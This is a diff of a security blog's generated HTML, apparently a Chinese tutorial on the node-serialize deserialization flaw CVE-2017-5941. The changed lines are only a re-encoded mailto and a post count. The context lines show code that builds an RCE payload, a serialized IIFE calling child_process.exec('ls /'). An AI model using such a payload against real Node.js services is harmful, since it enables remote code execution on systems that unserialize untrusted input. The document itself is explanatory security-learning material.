@@ -417,7 +417,7 @@
 <h2 id="nodejs反序列化漏洞（CVE-2017-5941）"><a href="#nodejs反序列化漏洞（CVE-2017-5941）" class="headerlink" title="nodejs反序列化漏洞（CVE-2017-5941）"></a>nodejs反序列化漏洞（CVE-2017-5941）</h2><p>前置知识：IIFE<br>IIFE是一个在定义时就会立即执行的js函数，一般写成如下形式：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123; /* code */ &#125;());</span><br><span class="line">(function()&#123; /* code */ &#125;)();</span><br></pre></td></tr></table></figure>
 <p>参考链接：<br><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Glossary/IIFE">IIFE（立即调用函数表达式</a></p>
-<p><a href="mailto:&#x6e;&#111;&#100;&#x65;&#45;&#115;&#x65;&#114;&#x69;&#x61;&#x6c;&#105;&#122;&#x65;&#64;&#x30;&#46;&#48;&#46;&#x34;">&#x6e;&#111;&#100;&#x65;&#45;&#115;&#x65;&#114;&#x69;&#x61;&#x6c;&#105;&#122;&#x65;&#64;&#x30;&#46;&#48;&#46;&#x34;</a>中存在反序列化漏洞：<br><img src="https://s2.loli.net/2022/05/12/7ha5wdxOXUFWJ98.png"></p>
+<p><a href="mailto:&#x6e;&#111;&#x64;&#101;&#45;&#115;&#101;&#114;&#x69;&#x61;&#x6c;&#x69;&#x7a;&#101;&#x40;&#x30;&#46;&#48;&#46;&#52;">&#x6e;&#111;&#x64;&#101;&#45;&#115;&#101;&#114;&#x69;&#x61;&#x6c;&#x69;&#x7a;&#101;&#x40;&#x30;&#46;&#48;&#46;&#52;</a>中存在反序列化漏洞：<br><img src="https://s2.loli.net/2022/05/12/7ha5wdxOXUFWJ98.png"></p>
 <p>我们发现被框出的这一语句的eval参数是被括号包裹着的，如果我们构造一个形如<code>function()&#123;&#125;()</code>的函数，在反序列化时就会被当中IIEF立即调用执行。也就是不可信输入传递到unserialize()的时候执行任意代码。</p>
 <p>创建payload时最好使用同一模块的序列化函数：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">serialize = require(&#x27;node-serialize&#x27;);</span><br><span class="line">var test = &#123;</span><br><span class="line"> rce : function()&#123;require(&#x27;child_process&#x27;).exec(&#x27;ls /&#x27;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;,</span><br><span class="line">&#125;</span><br><span class="line">console.log(&quot;Payload: \n&quot; + serialize.serialize(test));</span><br><span class="line"></span><br><span class="line">//&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(&#x27;child_process&#x27;).exec(&#x27;ls /&#x27;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
@@ -569,7 +569,7 @@
               
                 <a href="/archives%7C%7C%20archive">
               
-                  <span class="site-state-item-count">82</span>
+                  <span class="site-state-item-count">83</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
